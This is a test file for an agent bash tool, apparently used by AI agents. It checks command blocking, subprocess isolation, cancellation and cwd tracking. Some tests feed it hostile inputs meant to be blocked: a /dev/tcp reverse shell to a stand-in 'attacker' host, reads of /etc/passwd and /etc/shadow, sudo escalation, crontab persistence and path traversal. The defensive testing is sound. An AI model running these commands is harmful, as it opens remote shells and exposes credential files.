import { describe, expect, test } from "bun:test";
import { realpathSync } from "node:fs";
import type { SpawnTransformInput, SpawnTransformOutput } from "./bash-tool.js";
import { createBashTool } from "./bash-tool.js";

// ---------------------------------------------------------------------------
// Unit tests — security blocking
// ---------------------------------------------------------------------------

describe("createBashTool — security blocking", () => {
  const tool = createBashTool({ workspaceRoot: "/workspace" });

  async function exec(
    command: string,
    opts?: { cwd?: string; timeoutMs?: number },
  ): Promise<Record<string, unknown>> {
    const result = await tool.execute({ command, ...opts }, {});
    return result as Record<string, unknown>;
  }

  test("blocks reverse shell via /dev/tcp", async () => {
    const result = await exec("bash -i >& /dev/tcp/attacker/4444 0>&1");
    expect(result.error).toMatch(/blocked/i);
    expect(result.category).toBe("reverse-shell");
  });

  test("blocks eval injection", async () => {
    const result = await exec("eval $(cat /etc/passwd)");
    expect(result.error).toMatch(/blocked/i);
    expect(result.category).toBe("injection");
  });

  test("blocks sudo privilege escalation", async () => {
    const result = await exec("sudo cat /etc/shadow");
    expect(result.error).toMatch(/blocked/i);
    expect(result.category).toBe("privilege-escalation");
  });

  test("blocks crontab persistence", async () => {
    const result = await exec("crontab -e");
    expect(result.error).toMatch(/blocked/i);
    expect(result.category).toBe("persistence");
  });

  test("blocks path traversal in cwd", async () => {
    const result = await exec("ls", { cwd: "../../etc" });
    expect(result.error).toMatch(/blocked/i);
    expect(result.category).toBe("path-traversal");
  });

  test("blocks cwd escaping workspace root (when workspaceRoot is set)", async () => {
    const restricted = createBashTool({ workspaceRoot: "/workspace" });
    const result = (await restricted.execute({ command: "ls", cwd: "/etc" }, {})) as Record<
      string,
      unknown
    >;
    expect(result.error).toMatch(/blocked/i);
    expect(result.category).toBe("path-traversal");
  });

  test("blocks empty command", async () => {
    const result = await exec("   ");
    expect(result.error).toBeDefined();
  });

  test("spawn failure on non-existent cwd returns error, does not hang", async () => {
    // validatePath falls back to resolve() for paths that don't yet exist, so
    // a non-existent cwd passes path validation but fails at spawn time.
    // The 'error' handler on the child process must surface this as a blocked result.
    const restricted = createBashTool({ workspaceRoot: "/" }); // allow any cwd for this test
    const result = (await restricted.execute(
      { command: "echo hi", cwd: "/this/path/does/not/exist/koi-test" },
      {},
    )) as Record<string, unknown>;
    expect(result.error).toBeDefined();
    expect(typeof result.reason).toBe("string");
  });

  test("blocked result includes reason and pattern fields", async () => {
    const result = await exec("sudo whoami");
    expect(result.error).toBeDefined();
    expect(typeof result.reason).toBe("string");
    expect(typeof result.pattern).toBe("string");
    expect(typeof result.category).toBe("string");
  });

  describe("allowlist gate", () => {
    const restricted = createBashTool({
      policy: { allowlist: ["git ", "ls", "echo "] },
    });

    test("allows allowlisted command", async () => {
      const result = (await restricted.execute({ command: "git --version" }, {})) as Record<
        string,
        unknown
      >;
      // Should not be blocked (might fail if git not installed, but won't be a security block)
      if (typeof result.error === "string") {
        expect(result.category).not.toBe("injection"); // not blocked by allowlist
      }
    });

    test("blocks non-allowlisted command", async () => {
      const result = (await restricted.execute({ command: "cat README.md" }, {})) as Record<
        string,
        unknown
      >;
      expect(result.error).toMatch(/blocked/i);
    });
  });
});

// ---------------------------------------------------------------------------
// Integration tests — real subprocess execution
// ---------------------------------------------------------------------------

describe("createBashTool — integration (real subprocess)", () => {
  const tool = createBashTool();

  async function exec(
    command: string,
    opts?: { cwd?: string; timeoutMs?: number },
  ): Promise<Record<string, unknown>> {
    const result = await tool.execute({ command, ...opts }, {});
    return result as Record<string, unknown>;
  }

  test("executes simple echo command", async () => {
    const result = await exec("echo hello");
    expect(result.exitCode).toBe(0);
    expect(String(result.stdout).trim()).toBe("hello");
    expect(result.stderr).toBe("");
    expect(typeof result.durationMs).toBe("number");
  });

  test("captures stderr separately", async () => {
    const result = await exec("echo err >&2");
    expect(result.exitCode).toBe(0);
    expect(String(result.stderr).trim()).toBe("err");
  });

  test("returns non-zero exit code on command failure", async () => {
    // set -e means exit on error, but we capture the exit code
    const result = await exec("exit 42");
    expect(result.exitCode).toBe(42);
  });

  test("set -euo pipefail: fails on undefined variable", async () => {
    const result = await exec("echo $UNDEFINED_VAR_KOI_TEST");
    // With set -u, referencing an unset variable causes non-zero exit
    expect(result.exitCode).not.toBe(0);
  });

  test("multiline command executes correctly", async () => {
    const result = await exec("x=hello\necho $x");
    expect(result.exitCode).toBe(0);
    expect(String(result.stdout).trim()).toBe("hello");
  });

  test("cwd is used as working directory", async () => {
    // Use a subdirectory of process.cwd() so it stays within the default workspace root.
    // createBashTool() defaults workspaceRoot to process.cwd(); /tmp would be blocked.
    const subdir = realpathSync(process.cwd());
    const result = await exec("pwd", { cwd: subdir });
    expect(result.exitCode).toBe(0);
    expect(String(result.stdout).trim()).toBe(subdir);
  });

  test("result includes durationMs", async () => {
    const result = await exec("echo test");
    expect(typeof result.durationMs).toBe("number");
    expect(result.durationMs as number).toBeGreaterThan(0);
  });

  test("env isolation: HOME and PATH are set", async () => {
    const result = await exec("echo $HOME $PATH");
    expect(result.exitCode).toBe(0);
    const stdout = String(result.stdout).trim();
    expect(stdout.length).toBeGreaterThan(0);
  });

  test("env isolation: env vars from test process do not leak into subprocess", async () => {
    process.env.KOI_BASH_TOOL_TEST_SENTINEL = "should-not-leak";
    // List all subprocess env vars — the sentinel must not appear
    const result = await exec("env");
    delete process.env.KOI_BASH_TOOL_TEST_SENTINEL;
    expect(result.exitCode).toBe(0);
    expect(String(result.stdout)).not.toContain("KOI_BASH_TOOL_TEST_SENTINEL");
  });
});

// ---------------------------------------------------------------------------
// Cancellation tests — AbortSignal + subprocess kill
// ---------------------------------------------------------------------------

describe("createBashTool — cancellation and timeout", () => {
  const tool = createBashTool();

  test("AbortSignal cancels running subprocess", async () => {
    const controller = new AbortController();
    const startTime = Date.now();

    // Start a 60-second sleep
    const execPromise = tool.execute({ command: "sleep 60" }, { signal: controller.signal });

    // Cancel after a short delay
    setTimeout(() => controller.abort(), 100);

    const result = (await execPromise) as Record<string, unknown>;
    const elapsed = Date.now() - startTime;

    // Should complete much faster than 60s
    expect(elapsed).toBeLessThan(5_000);
    // Subprocess should have been killed (non-zero exit)
    expect(result.exitCode).not.toBe(0);
  });

  test("timeoutMs kills subprocess after timeout", async () => {
    const startTime = Date.now();

    const result = (await tool.execute({ command: "sleep 60", timeoutMs: 200 }, {})) as Record<
      string,
      unknown
    >;

    const elapsed = Date.now() - startTime;
    expect(elapsed).toBeLessThan(5_000);
    expect(result.timedOut).toBe(true);
    expect(result.exitCode).not.toBe(0);
  });

  test("pre-aborted signal prevents spawn", async () => {
    const controller = new AbortController();
    controller.abort();

    await expect(
      tool.execute({ command: "echo should-not-run" }, { signal: controller.signal }),
    ).rejects.toBeDefined();
  });

  test("cancellation kills descendant processes (process group kill)", async () => {
    // Verify that child processes spawned by bash are also killed on cancellation.
    // Strategy: bash spawns a background 'sleep 1' that would write a marker file
    // after 500ms.  We cancel after 100ms.  After waiting 1s the marker must not exist,
    // proving the descendant was killed (not orphaned).
    const markerFile = `/tmp/koi-pgid-test-${Date.now()}.marker`;
    const controller = new AbortController();

    const execPromise = tool.execute(
      { command: `sleep 0.4 && touch ${markerFile} &\nwait` },
      { signal: controller.signal },
    );

    // Cancel before the background sleep would write the marker
    setTimeout(() => controller.abort(), 100);
    await execPromise.catch(() => {});

    // Wait longer than the sleep duration so the orphan would have written by now
    await new Promise((r) => setTimeout(r, 800));

    const { existsSync } = await import("node:fs");
    expect(existsSync(markerFile)).toBe(false);
  });

  test("subsequent execution works after cancellation", async () => {
    const controller = new AbortController();

    const cancelledExec = tool.execute({ command: "sleep 60" }, { signal: controller.signal });
    setTimeout(() => controller.abort(), 50);
    await cancelledExec.catch(() => {});

    // Should still work after a cancelled execution
    const result = (await tool.execute({ command: "echo still-works" }, {})) as Record<
      string,
      unknown
    >;
    expect(result.exitCode).toBe(0);
    expect(String(result.stdout).trim()).toBe("still-works");
  });
});

// ---------------------------------------------------------------------------
// Output budgeting tests
// ---------------------------------------------------------------------------

describe("createBashTool — output budgeting", () => {
  test("truncates output exceeding maxOutputBytes", async () => {
    const tool = createBashTool({ policy: { maxOutputBytes: 100 } });

    // Generate output larger than 100 bytes
    const result = (await tool.execute(
      { command: "python3 -c \"print('x' * 200)\" 2>/dev/null || printf '%0.s x' {1..200}" },
      {},
    )) as Record<string, unknown>;

    if (result.truncated === true) {
      expect(result.truncatedNote).toMatch(/100 bytes/);
    }
    // Either truncated or the command failed — both acceptable
    expect(result.error).toBeUndefined();
  });

  test("does not set truncated for small output", async () => {
    const tool = createBashTool({ policy: { maxOutputBytes: 1_000_000 } });
    const result = (await tool.execute({ command: "echo small" }, {})) as Record<string, unknown>;
    expect(result.truncated).toBeUndefined();
    expect(result.exitCode).toBe(0);
  });
});

// ---------------------------------------------------------------------------
// Tool descriptor validation
// ---------------------------------------------------------------------------

describe("createBashTool — tool descriptor", () => {
  test("has correct descriptor shape", () => {
    const tool = createBashTool();
    expect(tool.descriptor.name).toBe("Bash");
    expect(typeof tool.descriptor.description).toBe("string");
    expect(tool.descriptor.description.length).toBeGreaterThan(0);
    expect(tool.origin).toBe("primordial");
  });

  test("input schema requires command field", () => {
    const schema = createBashTool().descriptor.inputSchema;
    expect((schema as Record<string, unknown>).required).toContain("command");
  });
});

// ---------------------------------------------------------------------------
// wrapCommand (SpawnTransform) tests
// ---------------------------------------------------------------------------

describe("createBashTool — wrapCommand (SpawnTransform)", () => {
  test("passes through when no wrapCommand is set", async () => {
    const tool = createBashTool();
    const result = (await tool.execute({ command: "echo passthrough" }, {})) as Record<
      string,
      unknown
    >;
    expect(result.exitCode).toBe(0);
    expect(String(result.stdout).trim()).toBe("passthrough");
  });

  test("wrapCommand receives correct argv structure", async () => {
    let captured: SpawnTransformInput | undefined;
    const tool = createBashTool({
      wrapCommand: (input: SpawnTransformInput): SpawnTransformOutput => {
        captured = input;
        return input; // pass through unchanged
      },
    });
    const result = (await tool.execute({ command: "echo transformed" }, {})) as Record<
      string,
      unknown
    >;
    expect(result.exitCode).toBe(0);
    expect(captured).toBeDefined();
    expect(captured?.argv[0]).toBe("bash");
    expect(captured?.argv[1]).toBe("--noprofile");
    expect(captured?.argv[2]).toBe("--norc");
    expect(captured?.argv[3]).toBe("-c");
    expect(captured?.argv[4]).toContain("echo transformed");
    expect(typeof captured?.cwd).toBe("string");
    expect(captured?.env.PATH).toBeDefined();
  });

  test("wrapCommand can prepend sandbox argv", async () => {
    const tool = createBashTool({
      wrapCommand: (input: SpawnTransformInput): SpawnTransformOutput => ({
        // Simulate sandbox by wrapping with env (which passes through to bash)
        argv: ["env", ...input.argv],
        cwd: input.cwd,
        env: input.env,
      }),
    });
    const result = (await tool.execute({ command: "echo sandboxed" }, {})) as Record<
      string,
      unknown
    >;
    expect(result.exitCode).toBe(0);
    expect(String(result.stdout).trim()).toBe("sandboxed");
  });

  test("wrapCommand can extend environment", async () => {
    const tool = createBashTool({
      wrapCommand: (input: SpawnTransformInput): SpawnTransformOutput => ({
        argv: input.argv,
        cwd: input.cwd,
        env: { ...input.env, KOI_TEST_MARKER: "present" },
      }),
    });
    const result = (await tool.execute({ command: "echo $KOI_TEST_MARKER" }, {})) as Record<
      string,
      unknown
    >;
    expect(result.exitCode).toBe(0);
    expect(String(result.stdout).trim()).toBe("present");
  });

  test("wrapCommand returning empty argv produces error", async () => {
    const tool = createBashTool({
      wrapCommand: (_input: SpawnTransformInput): SpawnTransformOutput => ({
        argv: [],
        cwd: _input.cwd,
        env: _input.env,
      }),
    });
    const result = (await tool.execute({ command: "echo test" }, {})) as Record<string, unknown>;
    expect(result.error).toBeDefined();
    expect(String(result.error)).toMatch(/empty argv/i);
  });
});

// ---------------------------------------------------------------------------
// trackCwd tests
// ---------------------------------------------------------------------------

describe("createBashTool — trackCwd", () => {
  test("cwd persists across calls after successful cd", async () => {
    const wsRoot = realpathSync(process.cwd());
    const tool = createBashTool({ trackCwd: true, workspaceRoot: wsRoot });

    // cd into a subdirectory (must exist within workspace)
    const result1 = (await tool.execute({ command: "cd packages && pwd" }, {})) as Record<
      string,
      unknown
    >;
    expect(result1.exitCode).toBe(0);
    expect(result1.cwd).toBe(`${wsRoot}/packages`);

    // Next call should use the tracked cwd
    const result2 = (await tool.execute({ command: "pwd" }, {})) as Record<string, unknown>;
    expect(result2.exitCode).toBe(0);
    expect(String(result2.stdout).trim()).toBe(`${wsRoot}/packages`);
    expect(result2.cwd).toBe(`${wsRoot}/packages`);
  });

  test("cwd does NOT update on failed command", async () => {
    const wsRoot = realpathSync(process.cwd());
    const tool = createBashTool({ trackCwd: true, workspaceRoot: wsRoot });

    // Run a failing command after cd — cwd should NOT update
    const result1 = (await tool.execute({ command: "cd packages && false" }, {})) as Record<
      string,
      unknown
    >;
    expect(result1.exitCode).not.toBe(0);
    // cwd should still be workspace root since command failed
    expect(result1.cwd).toBe(wsRoot);

    // Verify next call still uses workspace root
    const result2 = (await tool.execute({ command: "pwd" }, {})) as Record<string, unknown>;
    expect(result2.exitCode).toBe(0);
    expect(String(result2.stdout).trim()).toBe(wsRoot);
  });

  test("explicit cwd arg overrides tracked cwd", async () => {
    const wsRoot = realpathSync(process.cwd());
    const tool = createBashTool({ trackCwd: true, workspaceRoot: wsRoot });

    // Track into packages/
    await tool.execute({ command: "cd packages" }, {});

    // Explicit cwd should override tracked
    const result = (await tool.execute({ command: "pwd", cwd: wsRoot }, {})) as Record<
      string,
      unknown
    >;
    expect(result.exitCode).toBe(0);
    expect(String(result.stdout).trim()).toBe(wsRoot);
  });

  test("cwd field is absent when trackCwd is false", async () => {
    const tool = createBashTool({ trackCwd: false });
    const result = (await tool.execute({ command: "echo test" }, {})) as Record<string, unknown>;
    expect(result.exitCode).toBe(0);
    expect(result.cwd).toBeUndefined();
  });

  test("cwd field is absent when trackCwd is not set", async () => {
    const tool = createBashTool();
    const result = (await tool.execute({ command: "echo test" }, {})) as Record<string, unknown>;
    expect(result.exitCode).toBe(0);
    expect(result.cwd).toBeUndefined();
  });

  test("trackCwd rejects cwd that escapes workspace root", async () => {
    const wsRoot = realpathSync(process.cwd());
    const tool = createBashTool({ trackCwd: true, workspaceRoot: wsRoot });

    // Even if bash exits 0 after cd /tmp, the tracked cwd should NOT
    // update to outside workspace. The trap writes /tmp to the file,
    // but isWithinWorkspace rejects it.
    // Note: this test uses workspaceRoot=process.cwd(), and /tmp is outside it.
    // The security classifier would block "cd /tmp" if it detects path traversal,
    // but cd itself isn't blocked. The cwd tracking validation catches it.
    const result = (await tool.execute({ command: "cd /tmp && pwd" }, {})) as Record<
      string,
      unknown
    >;
    // Command may succeed (exit 0) if /tmp cd works
    // But the tracked cwd should NOT be /tmp — it should remain wsRoot
    if (result.exitCode === 0) {
      expect(result.cwd).toBe(wsRoot);
    }
  });

  test("description mentions cwd tracking when enabled", () => {
    const tool = createBashTool({ trackCwd: true });
    expect(tool.descriptor.description).toContain("CWD tracking is enabled");
  });

  test("trackCwd with wrapCommand that remaps cwd does not advance tracked cwd", async () => {
    const wsRoot = realpathSync(process.cwd());
    const tool = createBashTool({
      trackCwd: true,
      workspaceRoot: wsRoot,
      wrapCommand: (input) => ({
        // Simulate sandbox: remap cwd to /tmp (outside workspace)
        // The shell's pwd -P will report /tmp-based paths
        argv: input.argv,
        cwd: "/tmp",
        env: input.env,
      }),
    });

    // Command runs in /tmp due to wrapCommand, pwd -P reports /tmp
    // trackCwd should NOT update because /tmp is outside workspaceRoot
    const result = (await tool.execute({ command: "pwd" }, {})) as Record<string, unknown>;
    expect(result.exitCode).toBe(0);
    // Tracked cwd stays at wsRoot because sandbox path is outside workspace
    expect(result.cwd).toBe(wsRoot);
  });
});
